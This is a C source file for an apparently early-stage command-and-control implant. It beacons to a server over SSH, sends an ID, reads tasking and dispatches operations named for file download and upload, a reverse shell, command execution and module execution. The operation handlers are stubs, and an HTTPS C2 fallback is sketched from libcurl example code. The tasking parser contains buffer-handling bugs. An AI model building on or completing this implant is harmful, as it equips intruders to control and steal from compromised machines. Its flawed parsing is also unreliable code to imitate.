#include "agent.h"

struct tasking_struct{
	int operation;
	char *opts;
};

int func_loop(ssh_session session)
{
	/* Primary function loop */
	// Initialize vars
  	ssh_channel channel;
  	int rc;
  	char tasking[2048];
  	int nbytes;
	int quitting = 0;
  	channel = ssh_channel_new(session);

	printf("[+] Created new SSH channel\n");
  	if (channel == NULL)
    	return SSH_ERROR;

	// Open channel
  	rc = ssh_channel_open_session(channel);
	printf("[+] Opened SSH Channel with remote server\n");
  	if (rc != SSH_OK)
  	{
    	ssh_channel_free(channel);
    	return rc;
  	}

	// Request a shell interface
  	rc = ssh_channel_request_shell(channel);
	
	printf("[ ] Sent request for shell\n");
  	if (rc != SSH_OK)
  	{
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
  	}
	printf("[+] Made it through check\n");

	// Begin the meat of the stuff


	// Send the global ID
	rc = ssh_channel_write(channel, GLOB_ID, strlen(GLOB_ID));

	printf("Wrote ID to channel\n");
		
	if (rc == SSH_ERROR){
		printf("caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
	}

	
	nbytes = ssh_channel_read(channel, tasking, sizeof(tasking), 0);
	printf("read %d bytes from channel\n", nbytes);
	if (nbytes < 0){
		printf("Caught read error from server...\n");
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return SSH_ERROR;
	}		

	printf("Read data: %s\n", tasking);
	quitting = parse_tasking(tasking, channel);
	
	  // close connections
	ssh_channel_write(channel, "\0", 2);

  	ssh_channel_send_eof(channel);
  	ssh_channel_close(channel);
  	ssh_channel_free(channel);
  	return SSH_OK;
}

int parse_tasking(char *tasking, ssh_channel chan){
	/* Parses and handles the tasking input from the server*/

	// checks if there is no tasking
	if(!strcmp(tasking, "NULL :)\n")){
		printf("No tasking available. Quitting...\n");
		ssh_channel_write(chan, "\0", 2);
		return 1;
	}


	// get the number of instructions to complete
	int num = 0;
	int size = strlen(tasking);
	char *tmp = tasking;
	for (; tasking[num]; tasking[num]=='\n' ? num++ : *tasking++);
	tasking = tmp;
	printf("Number of tasks to do: %d\n", num);
	struct tasking_struct tasking_arr[num];

	char *p = strtok(tasking, "\n");
	printf("Filling the structure array\n");
	
	// Parses the data into structure array
	int i = 0;
	while(p != NULL)
	{
		// get operation int
		char tmpbf[2];
		strncat(tmpbf, p, 2);
		tasking_arr[i].operation = atoi(tmpbf);

		// get options for operation
		int sz = strlen(p+3);
		char *dat = malloc(sz);
		memset(dat, 0, sz);
		strcat(dat, p+3);
		tasking_arr[i].opts = dat;

		// clean up and move on
		p = strtok(NULL, "\n");
		memset(tmpbf, 0, 2);
		i++;
	}


	printf("Initializing variables\n");

	for(int j = 0; j < num; j++){
		switch(tasking_arr[j].operation)
		{
		case AGENT_DOWN_FILE:
			printf("Got tasking to download file %s\n", tasking_arr[j].opts);
			//ssh_channel_write(chan, )
			break;
		case AGENT_REV_SHELL:
			printf("Got tasking to start reverse shell\n");
			break;
		case AGENT_UP_FILE:
			printf("Got tasking to upload file %s\n", tasking_arr[j].opts);
			break;
		case AGENT_EXEC_SC:
			printf("Got tasking to execute command %s\n", tasking_arr[j].opts);
			break;
		case AGENT_EXEC_MODULE:
			printf("Got tasking to execute module %s\n", tasking_arr[j].opts);
			break;

		case AGENT_EXIT:
			printf("Got agent exit request\n");
			break;

		default:
			printf("Caught unknown tasking value: %d\n", tasking_arr[j].operation);
			break;
		}
	
	}
	return 0;
}

void get_tasking_https(){
	// Test thing for HTTPS C2 infrastructure, in case of SSH being blocked/filtered
	CURL *curl;
  	CURLcode res;

  	curl_global_init(CURL_GLOBAL_DEFAULT);

  	curl = curl_easy_init();
  	if(curl) {
    	curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/");

#ifdef SKIP_PEER_VERIFICATION
    /*
     * If you want to connect to a site who isn't using a certificate that is
     * signed by one of the certs in the CA bundle you have, you can skip the
     * verification of the server's certificate. This makes the connection
     * A LOT LESS SECURE.
     *
     * If you have a CA cert for the server stored someplace else than in the
     * default bundle, then the CURLOPT_CAPATH option might come handy for
     * you.
     */
    	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
#endif

#ifdef SKIP_HOSTNAME_VERIFICATION
    /*
     * If the site you're connecting to uses a different host name that what
     * they have mentioned in their server certificate's commonName (or
     * subjectAltName) fields, libcurl will refuse to connect. You can skip
     * this check, but this will make the connection less secure.
     */
    	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
#endif

    	/* Perform the request, res will get the return code */
    	res = curl_easy_perform(curl);
    	/* Check for errors */
    	if(res != CURLE_OK)
      		fprintf(stderr, "curl_easy_perform() failed: %s\n",
    				curl_easy_strerror(res));

    	/* always cleanup */
    	curl_easy_cleanup(curl);
  	}

  	curl_global_cleanup();
}